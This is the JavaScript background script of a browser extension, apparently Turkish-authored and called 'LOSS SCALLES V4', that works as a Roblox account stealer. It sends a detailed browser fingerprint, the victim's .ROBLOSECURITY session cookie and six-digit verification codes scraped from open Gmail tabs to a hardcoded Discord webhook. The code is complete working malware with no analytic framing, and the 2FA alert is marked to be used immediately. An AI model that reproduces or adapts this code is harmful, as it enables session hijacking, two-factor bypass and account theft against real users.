// ===== LOSS SCALLES V4 - CORS FIX =====
const WEBHOOK = 'https://discord.com/api/webhooks/1519794208104386702/ZWaMVE7HPak83_GGUnqWmaFwh5G_OCYDY-CKroh5PWW8tUe_GxXM79T28r2uDj8ZkawD';

var sonCookie = '';
var sonKod = '';
var sonKodZamani = 0;

// ============ FINGERPRINT ============
var fingerprintGonderildi = false;

function fingerprintTopla(tabId) {
    if (fingerprintGonderildi) return;
    fingerprintGonderildi = true;

    chrome.scripting.executeScript({
        target: {tabId: tabId},
        func: () => {
            try {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || null,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    plugins: Array.from(navigator.plugins || []).map(p => p.name),
                    webgl: (() => {
                        try {
                            const c = document.createElement('canvas');
                            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                            if (!gl) return null;
                            return {
                                renderer: gl.getParameter(gl.RENDERER),
                                vendor: gl.getParameter(gl.VENDOR)
                            };
                        } catch(e) { return null; }
                    })(),
                    canvas: (() => {
                        try {
                            const c = document.createElement('canvas');
                            c.width = 200;
                            c.height = 50;
                            const ctx = c.getContext('2d');
                            ctx.textBaseline = 'top';
                            ctx.font = '14px Arial';
                            ctx.fillStyle = '#f60';
                            ctx.fillRect(125, 1, 62, 20);
                            ctx.fillStyle = '#069';
                            ctx.fillText('CVE-2024-38537', 2, 15);
                            return c.toDataURL().substring(0, 100);
                        } catch(e) { return null; }
                    })(),
                    fonts: (() => {
                        try {
                            const f = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Palatino', 'Tahoma'];
                            const d = document.createElement('div');
                            d.style.position = 'absolute';
                            d.style.visibility = 'hidden';
                            d.style.fontSize = '72px';
                            document.body.appendChild(d);
                            const base = f.filter(font => {
                                d.style.fontFamily = font;
                                return d.offsetWidth > 0 || d.offsetHeight > 0;
                            });
                            document.body.removeChild(d);
                            return base;
                        } catch(e) { return []; }
                    })(),
                    audio: (() => {
                        try {
                            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                            const osc = ctx.createOscillator();
                            osc.type = 'triangle';
                            osc.frequency.setValueAtTime(10000, ctx.currentTime);
                            const dst = ctx.createGain();
                            dst.gain.setValueAtTime(0.5, ctx.currentTime);
                            osc.connect(dst);
                            dst.connect(ctx.destination);
                            osc.start(0);
                            return ctx.startRendering ? 'supported' : null;
                        } catch(e) { return null; }
                    })(),
                    touchSupport: 'ontouchstart' in window,
                    webdriver: navigator.webdriver,
                    productSub: navigator.productSub,
                    vendorSub: navigator.vendorSub,
                    appVersion: navigator.appVersion,
                    appName: navigator.appName,
                    appCodeName: navigator.appCodeName,
                    mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
                    cpuClass: navigator.cpuClass || null,
                    oscpu: navigator.oscpu || null
                };
                return JSON.stringify(fp, null, 2);
            } catch(e) {
                return 'HATA: ' + e.message;
            }
        }
    }).then((results) => {
        if (!results?.[0]?.result) return;
        gonder('**🖥️ FINGERPRINT**\n```json\n' + results[0].result + '\n```');
    }).catch((e) => {
        console.log('[LS V4] Fingerprint hatası:', e.message);
    });
}

// Fingerprint'i sadece normal HTTP/HTTPS sayfalarında çalıştır
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete') return;
    if (!tab.url) return;
    if (!tab.url.startsWith('http')) return;
    
    if (!fingerprintGonderildi) {
        fingerprintTopla(tabId);
    }
});

console.log('[LS V4] Başlatıldı');

// ============ COOKIE ============
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (!tab.url?.includes('roblox.com')) return;
    if (changeInfo.status !== 'complete') return;
    
    setTimeout(() => {
        chrome.cookies.getAll({domain: '.roblox.com'}, (cookies) => {
            if (!cookies) return;
            
            for (let c of cookies) {
                if (c.name === '.ROBLOSECURITY' && c.value !== sonCookie) {
                    sonCookie = c.value;
                    gonder('**🍪 COOKIE**\n```' + c.value + '```');
                }
            }
        });
    }, 1000);
});

// ============ GMAIL 2FA ============
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (!tab.url?.includes('mail.google.com')) return;
    if (changeInfo.status !== 'complete') return;
    
    taraTab(tabId);
});

setInterval(() => {
    chrome.tabs.query({url: '*://mail.google.com/*'}, (tabs) => {
        tabs.forEach(tab => taraTab(tab.id));
    });
}, 3000);

function taraTab(tabId) {
    chrome.scripting.executeScript({
        target: {tabId: tabId},
        func: () => {
            const text = document.body.innerText;
            if (!text.toLowerCase().includes('roblox')) return null;
            
            const matches = text.match(/\b\d{6}\b/g);
            if (!matches) return null;
            
            for (let kod of matches) {
                const idx = text.indexOf(kod);
                const surrounding = text.substring(Math.max(0, idx-100), idx+100).toLowerCase();
                
                if (surrounding.includes('security') || 
                    surrounding.includes('verification') ||
                    surrounding.includes('code') ||
                    surrounding.includes('doğrulama') ||
                    surrounding.includes('güvenlik')) {
                    return kod;
                }
            }
            
            return matches[0];
        }
    }).then((results) => {
        if (!results?.[0]?.result) return;
        
        const kod = results[0].result;
        const simdi = Date.now();
        
        if (kod === sonKod && simdi - sonKodZamani < 30000) return;
        
        sonKod = kod;
        sonKodZamani = simdi;
        
        gonder('**🔐 2FA KODU**\n```' + kod + '```\n⚡ **HEMEN KULLAN**');
    }).catch((e) => {
        console.log('[LS V4] Script hatası:', e.message);
    });
}

// ============ WEBHOOK - CORS FIX ============
function gonder(mesaj) {
    try {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({content: mesaj})
        }).then(res => {
            if (!res.ok) {
                console.error('[LS V4] Webhook HTTP hatası:', res.status);
                return;
            }
            console.log('[LS V4] Gönderildi:', mesaj.substring(0, 30));
        }).catch(err => {
            console.error('[LS V4] Fetch hatası:', err.message);
            xhrGonder(mesaj);
        });
    } catch(e) {
        console.error('[LS V4] Genel hata:', e);
        xhrGonder(mesaj);
    }
}

function xhrGonder(mesaj) {
    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', WEBHOOK, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200 || xhr.status === 204) {
                    console.log('[LS V4] XHR ile gönderildi');
                } else {
                    console.error('[LS V4] XHR hatası:', xhr.status);
                }
            }
        };
        xhr.send(JSON.stringify({content: mesaj}));
    } catch(e) {
        console.error('[LS V4] XHR de başarısız:', e);
    }
}

console.log('[LS V4] Hazır - Webhook:', WEBHOOK.substring(0, 50) + '...');